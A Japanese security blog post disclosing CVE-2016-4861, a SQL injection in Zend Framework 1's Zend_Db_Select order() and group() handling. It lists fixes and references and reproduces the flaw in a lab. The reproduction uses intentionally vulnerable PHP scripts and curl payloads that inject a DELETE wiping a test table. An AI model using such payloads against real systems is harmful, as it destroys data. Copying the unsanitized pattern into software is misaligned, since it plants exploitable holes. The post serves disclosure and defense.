---
layout: post
title:  "CVE-2016-4861 - Zend Framework における SQL インジェクションの脆弱性"
date:   2016-09-16 11:00:00 +0900
categories: vulnerability
toc: true
---

# 概要

HASHコンサルティング株式会社 徳丸 浩 さんにより、ZendFramework 1に[Zend_Db_Select](https://framework.zend.com/manual/1.12/ja/zend.db.select.html)のOrder by句およびGroup By句の引数の処理に起因するSQLインジェクションの脆弱性が発見されました。

# CVSS v3

2016年09月16日時点でNVDは非公開

# 解決策、緩和策情報

 * Zend Framework 1.12.20へのアップグレードしてください。
 * 修正コミット情報
   * https://github.com/zendframework/zf1/commit/b1c71dd94296d9000127720c85a7ea9e3b35af4b
   * https://github.com/zendframework/zf1/commit/bf3f40605be3d8f136a07ae991079a7dcb34d967

# 影響を受けるソフトウェアとバージョン

 * Zend Framework 1.12.20以前のversion

Zned Framework 2系, 3系はこの脆弱性の影響を受けません。

# 技術的な詳細

## Zend Framework 1.12.19の環境構築

 * Zend Framework 1.12.19のダウンロード

```
kosuke@scapegoat ~ $ wget https://packages.zendframework.com/releases/ZendFramework-1.12.19/ZendFramework-1.12.19.tar.gz
kosuke@scapegoat ~ $ tar zxvf ZendFramework-1.12.19.tar.gz
```

 * php.iniを編集する

```
root@scapegoat:~# vim /etc/php5/apache2/php.ini
include_path = ".:/home/kosuke/ZendFramework-1.12.19/library"
```

 * テスト用スクリプト

```
root@scapegoat:~# cat /var/www/html/zend.php
<?php
require_once 'Zend/Version.php';
echo 'Hello, Zend Framework! Ver ' . Zend_Version::VERSION;
```

 * Apacheを再起動

```
root@scapegoat:~# service apache2 restart
```

 * Zendが稼働することを確認

```
root@scapegoat:~# curl http://scapegoat.test/zend.php
Hello, Zend Framework! Ver 1.12.19
```

## テスト用のMySQLの環境を構築

 * MySQLユーザとデータベースの作成

```
kosuke@scapegoat ~ $ mysql -uroot -pmust_rewrite
mysql> create database CVE_2016_4861;
mysql> GRANT ALL ON CVE_2016_4861.* TO 'zend'@'%' IDENTIFIED BY 'pass';
```

 * MySQLのテーブルを作成

```
kosuke@scapegoat ~ $ mysql -uzend -ppass
mysql> use CVE_2016_4861;
Database changed
mysql> create table account (id int, name varchar(100), password varchar(100));
Query OK, 0 rows affected (0.01 sec)

mysql> desc account;
+----------+--------------+------+-----+---------+-------+
| Field    | Type         | Null | Key | Default | Extra |
+----------+--------------+------+-----+---------+-------+
| id       | int(11)      | YES  |     | NULL    |       |
| name     | varchar(100) | YES  |     | NULL    |       |
| password | varchar(100) | YES  |     | NULL    |       |
+----------+--------------+------+-----+---------+-------+
3 rows in set (0.00 sec)

mysql> insert into account (id, name, password) values(1, 'hoge', 'h0ge');
Query OK, 1 row affected (0.03 sec)

mysql> insert into account (id, name, password) values(2, 'foo', 'f00');
Query OK, 1 row affected (0.00 sec)

mysql> insert into account (id, name, password) values(3, 'bar', 'b@r');
Query OK, 1 row affected (0.00 sec)
```

## order byの検証

 * order.php

```php
<?php
require_once 'Zend/Db.php';
$mysql_info = array ('host' => '127.0.0.1',
                    'username' => 'zend',
                    'password' => 'pass',
                    'dbname'   => 'CVE_2016_4861',
                    'charset'   => 'UTF8'
                    );

$order = $_POST['order'];

$db = Zend_Db::factory('PDO_MYSQL', $mysql_info);
$select = $db->select();
$select->from('account');
$select->order($order);
$stmt = $db->query($select);
$result = $stmt->fetchAll();
var_dump($result);
?>
```

 * 脆弱性を利用してaccountテーブルのすべてのレコードを削除する

```
kosuke@scapegoat ~ $ curl --data-urlencode "order=MD5(\"a(\");DELETE FROM account; #)" http://scapegoat.test/order.php
```

![order]({{site.baseurl}}/images/2016/09/16/order.gif)

## group byの検証

 * group.php

```php
<?php
require_once 'Zend/Db.php';
$mysql_info = array ('host' => '127.0.0.1',
                    'username' => 'zend',
                    'password' => 'pass',
                    'dbname'   => 'CVE_2016_4861',
                    'charset'   => 'UTF8'
                    );

$group = $_POST['group'];

$db = Zend_Db::factory('PDO_MYSQL', $mysql_info);
$select = $db->select();
$select->from('account');
$select->group($group);
$stmt = $db->query($select);
$result = $stmt->fetchAll();
var_dump($result);
?>
```

 * 脆弱性を利用してaccountテーブルのすべてのレコードを削除する

```
kosuke@scapegoat ~ $ curl --data-urlencode "group=MD5(\"a(\");DELETE FROM account; #)" http://scapegoat.test/group.php
```

![group]({{site.baseurl}}/images/2016/09/16/group.gif)


# 追跡が必要な情報元

 * [CERT](https://www.kb.cert.org/vuls/byid?query=CVE-2016-4861&searchview=)
 * [Debian](https://security-tracker.debian.org/tracker/CVE-2016-4861)
 * [Github](https://github.com/search?q="CVE-2016-4861")
 * [LWN](https://lwn.net/Search/DoSearch?words=CVE-2016-4861)
 * [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-4861)
 * [PacketStorm](https://packetstormsecurity.com/search/?q=CVE-2016-4861)
 * [Redhat](https://access.redhat.com/security/cve/CVE-2016-4861)
 * [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2016-4861.html)
 * [bugtraq](https://marc.info/?s=CVE-2016-4861&l=bugtraq)
 * [exploitdb](https://www.exploit-db.com/search/?action=search&cve=2016-4861)
 * [fulldisc](https://marc.info/?s=CVE-2016-4861&l=full-disclosure)
 * [metasploit](https://www.rapid7.com/db/search?q=CVE-2016-4861)
 * [oss-sec](https://marc.info/?s=CVE-2016-4861&l=oss-security)

# 参考文献

 * https://framework.zend.com/security/advisory/ZF2016-03
 * http://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-000158.html
 * http://qiita.com/Kaki_Shoichi/items/d12b98d6ea56cfd1a6d4
 * https://framework.zend.com/manual/1.12/ja/zend.db.select.html
 * https://github.com/zendframework/zf1/blob/a90f3a8d71e0788020f730da83674b7312bd3b16/library/Zend/Db/Select.php#L89

